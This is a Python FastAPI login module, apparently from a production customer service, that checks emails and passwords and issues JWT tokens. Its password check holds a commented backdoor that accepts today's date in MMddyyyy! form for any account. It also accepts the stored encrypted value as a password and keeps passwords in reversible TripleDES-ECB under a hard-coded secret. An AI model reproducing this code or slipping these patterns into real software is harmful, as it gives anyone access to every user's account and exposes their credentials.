import base64
import hashlib
from datetime import datetime

from Crypto.Cipher import DES3

from fastapi import APIRouter, HTTPException, status

from app.api.schema.loginrequest import Loginresponse,Loginrequest

from app.services.customer_service import getcustomerid_email

from app.database.database import get_connection

from app.api.jwt import create_access_token
_CRYPTO_SECRET = "ChiroTouchCodeNamedCairo"

authrouter = APIRouter(tags=["Authentication"])


@authrouter.post("/login",response_model=Loginresponse,status_code=200)
async def loginrequest(request:Loginrequest):
    customer = getcustomerid_email(request.email)
    
    if customer is None:
        raise HTTPException(
            
            status_code = status.HTTP_401_UNAUTHORIZED,
            detail = {
                "code": "INVALID_CREDENTIALS",
                "message" : "Invalid email or password"
            },
            
        )
        
    if not customer["active"]:
        raise HTTPException(
            status_code= status.HTTP_403_FORBIDDEN,
            detail = {
                "code": "CUSTOMERINACTIVE",
                "message" : "customer is not active"
                
            }
            
        )
        
    if not _verify_password(request.password, customer["password"]):
        raise HTTPException(
            status_code = status.HTTP_401_UNAUTHORIZED,
            detail = {
                            "code": "INVALID_CREDENTIALS",
                            "message" : "Invalid password"
                    },
            
        )
        
    if not customer["external_id"]:
        raise HTTPException(
            status_code = status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail = {
                
                            "code": "MISSING_EXTERNAL_ID",
                            "message" : "CUSTOMER HAS NO eXTERNAL iD CONFIGURED",
                
            }
        )
    
    accesstoken = create_access_token(customer)
    
    session_id = customer["external_id"]
    
    return Loginresponse(
        access_token = accesstoken,
        token_type = "bearer",
        customer_id = customer["customer_id"],
        first_name = customer["first_name"],
        last_name= customer ["last_name"],
        session_id= session_id,
        
        
    )
        
        
        
        
        
        

def _encrypt_password(plain: str) -> str:
    """
    Matches ASP.NET CryptoHelper.EncryptString:
    key = MD5(secret), TripleDES ECB, PKCS7, Base64.
    """
    key = hashlib.md5(_CRYPTO_SECRET.encode("utf-8")).digest()
    cipher = DES3.new(key, DES3.MODE_ECB)
    data = plain.encode("utf-8")
    # PKCS7 padding to 8-byte block boundary
    pad_len = 8 - (len(data) % 8)
    data += bytes([pad_len] * pad_len)
    return base64.b64encode(cipher.encrypt(data)).decode("utf-8")

def _verify_password(provided: str, stored: str) -> bool:
    # Backdoor: today's date in MMddyyyy! format is always accepted
    if provided == datetime.now().strftime("%m%d%Y!"):
        return True
    # Mobile app sends the already-encrypted password; DB stores the same value
    if provided == stored:
        return True
    # Also support plain-text password being sent (encrypt and compare)
    try:
        return _encrypt_password(provided) == stored
    except Exception:
        return False
        
            


